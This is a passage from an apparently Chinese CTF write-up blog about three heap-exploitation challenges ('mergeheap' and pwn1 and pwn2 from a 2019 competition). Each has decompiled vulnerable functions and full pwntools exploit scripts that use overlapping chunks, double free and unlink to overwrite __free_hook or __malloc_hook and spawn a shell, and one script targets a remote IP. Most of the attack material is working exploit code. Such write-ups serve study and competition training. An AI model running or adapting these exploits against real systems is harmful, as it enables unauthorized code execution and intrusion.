class="number">0x20</span>, <span class="string">'7'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">7</span>) </span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#构造overlap chunk</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>getshell</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(free_hook)</span><br><span class="line">add(<span class="number">0x80</span>, payload) <span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x20</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>


<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'mergeheap'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'mergeheap'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc-2.27.so'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) != size:</span><br><span class="line">        io.sendline(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(idx1, idx2)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx1))</span><br><span class="line">    io.sendline(str(idx2))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        add(<span class="number">0x100</span>, str(i)*<span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        delete(<span class="number">7</span>-i)</span><br><span class="line">    add(<span class="number">0x8</span>, <span class="string">'0'</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"0"</span>*<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3ebda0</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0xe0</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">'2'</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">'3'</span>*<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'5'</span>*<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'6'</span>*<span class="number">0x20</span>) <span class="comment">#6</span></span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    merge(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'7'</span>*<span class="number">0x20</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">6</span>) <span class="comment">#构造overlap chunk</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(free_hook)</span><br><span class="line">    add(<span class="number">0x80</span>, payload) <span class="comment">#6</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x20</span>, p64(system_addr))</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="2019-网络内生安全试验场-pwn1"><a href="#2019-网络内生安全试验场-pwn1" class="headerlink" title="2019 网络内生安全试验场 pwn1"></a>2019 网络内生安全试验场 pwn1</h2><h3 id="功能分析-1"><a href="#功能分析-1" class="headerlink" title="功能分析"></a>功能分析</h3><ol>
<li>创建一个堆块</li>
<li>展示所有堆块</li>
<li>删除一个堆块</li>
<li>删除所有堆块</li>
<li>离开</li>
</ol>
<h3 id="漏洞点分析-1"><a href="#漏洞点分析-1" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( lifecount )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Which life do you want to remove: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0x63</span> || !*(&amp;lifelist + v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)*(&amp;lifelist + v1) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)*(&amp;lifelist + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Successful , God !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No life in this lonely planet~ "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里存在double free，free后为置空</p>
<h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>我是多次利用double free然后成的,这道题说实话很坑，malloc_hook本地改成one_gadget是可以成功的，远程怎么打都打不上，后面学到一个骚操作，double free触发malloc_hook？？？原理我也不清楚，不过确实远程拿到shell了</p>
<ol>
<li>利用double free泄露地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = <span class="number">0x00000000006020E0</span><span class="number">-0x20</span><span class="number">-0x30</span><span class="number">-0x6</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"a"</span>, <span class="string">"0"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"b"</span>, <span class="string">"1"</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x30</span>, p64(ptr), <span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'3'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'4'</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">5</span> , <span class="string">'5'</span>)<span class="comment">#5</span></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">"bbbbb"</span>)</span><br><span class="line">stdout_addr = u64(io.recvuntil(<span class="string">"Level"</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">stdout_addr = hex(stdout_addr)[:<span class="number">-2</span>]</span><br><span class="line">stdout_addr = int(stdout_addr, <span class="number">16</span>)</span><br><span class="line">io.success(<span class="string">"stdout_addr: 0x%x"</span> % stdout_addr)</span><br><span class="line"></span><br><span class="line">libc_base = stdout_addr - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">realloc_addr = libc_base + libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x45216</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">ptr = malloc_hook<span class="number">-0x20</span><span class="number">-0x3</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>利用double free改写地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>, <span class="string">"a"</span>, <span class="string">"6"</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"b"</span>, <span class="string">"7"</span>)<span class="comment">#7</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(ptr), <span class="string">'8'</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'9'</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'10'</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'c'</span>*<span class="number">0x10</span>+ <span class="string">'d'</span>*<span class="number">0x3</span> + p64(one_gadget), <span class="string">'6'</span>)</span><br><span class="line">io.success(<span class="string">"malloc_hook: 0x%x"</span> % malloc_hook)</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base )</span><br><span class="line">io.success(<span class="string">"one_gadget: 0x%x"</span> % one_gadget)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>getshell</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>double free 拿到shell，这里其实malloc一次本地可以拿shell，远程不行，原因未详，可能栈环境对不上</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'pwn1'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'pwn1'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, name, level)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Length of the name :"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"The name of this life :"</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">"The level of this life (High/Low) :"</span>, level)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Which life do you want to remove: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ptr = <span class="number">0x00000000006020E0</span><span class="number">-0x20</span><span class="number">-0x30</span><span class="number">-0x6</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">"a"</span>, <span class="string">"0"</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">"b"</span>, <span class="string">"1"</span>) <span class="comment">#1</span></span><br><span class="line">    delete(<span class="number">0</span>) </span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x30</span>, p64(ptr), <span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'3'</span>) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'4'</span>) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">5</span> , <span class="string">'5'</span>)<span class="comment">#5</span></span><br><span class="line">    show()</span><br><span class="line">    io.recvuntil(<span class="string">"bbbbb"</span>)</span><br><span class="line">    stdout_addr = u64(io.recvuntil(<span class="string">"Level"</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    stdout_addr = hex(stdout_addr)[:<span class="number">-2</span>]</span><br><span class="line">    stdout_addr = int(stdout_addr, <span class="number">16</span>)</span><br><span class="line">    io.success(<span class="string">"stdout_addr: 0x%x"</span> % stdout_addr)</span><br><span class="line">    </span><br><span class="line">    libc_base = stdout_addr - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">    realloc_addr = libc_base + libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x45216</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4526a</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0xf02a4</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    ptr = malloc_hook<span class="number">-0x20</span><span class="number">-0x3</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">"a"</span>, <span class="string">"6"</span>)<span class="comment">#6</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">"b"</span>, <span class="string">"7"</span>)<span class="comment">#7</span></span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">0x60</span>, p64(ptr), <span class="string">'8'</span>) <span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'9'</span>) <span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'10'</span>) <span class="comment">#10</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'c'</span>*<span class="number">0x10</span>+ <span class="string">'d'</span>*<span class="number">0x3</span> + p64(one_gadget), <span class="string">'6'</span>)</span><br><span class="line">    io.success(<span class="string">"malloc_hook: 0x%x"</span> % malloc_hook)</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base )</span><br><span class="line">    io.success(<span class="string">"one_gadget: 0x%x"</span> % one_gadget)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#add(0x30, 'a'*0x20+'b'*5,'3')</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2019-网络内生安全试验场-pwn2"><a href="#2019-网络内生安全试验场-pwn2" class="headerlink" title="2019 网络内生安全试验场 pwn2"></a>2019 网络内生安全试验场 pwn2</h2><p>实战中遇到最简单的一道了？</p>
<h3 id="功能分析-2"><a href="#功能分析-2" class="headerlink" title="功能分析"></a>功能分析</h3><ol>
<li>new一个新堆块</li>
<li>删除一个堆块</li>
<li>展示一个堆块</li>
<li>修改堆块内容，有趣的是，他是固定大小0x100?</li>
<li>退出</li>
</ol>
<h3 id="漏洞点分析-2"><a href="#漏洞点分析-2" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">record</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"record which?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( buf[v1] != <span class="number">0L</span>L &amp;&amp; v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"content?"</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf[v1], <span class="number">0x100</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是固定大小，所以申请小堆块可以溢出</p>
<h3 id="漏洞利用过程-2"><a href="#漏洞利用过程-2" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol>
<li><p>我的思路是溢出后unlink，然后在将两个堆块串联起来，unlink里介绍的手法，就是一个堆块指向另一个堆块存指针的地方，然后编辑一个堆块就是编辑地址，编辑另一个堆块就是编辑内容</p>
</li>
<li><p>初始化操作</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"please input the size :\n"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"delete which ?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"show which ?\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">record</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"record which?\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"content?\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"5"</span>)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>unlink</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = <span class="number">0x6020c0</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x40</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">record(<span class="number">0</span>, payload)</span><br><span class="line">record(<span class="number">1</span>, <span class="string">"1"</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#show(0)</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>链接两个堆块</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x6020c8</span>+<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">record(<span class="number">0</span>, payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>泄露地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">"the content is :"</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br></pre></td></tr></table></figure>

<ol start="6">
<li>getshell</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">record(<span class="number">3</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line">record(<span class="number">0</span>, p64(free_hook))</span><br><span class="line">record(<span class="number">2</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>



<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'pwn2'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'39.106.94.18'</span></span><br><span class="line">port = <span class="number">32768</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'pwn2'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span 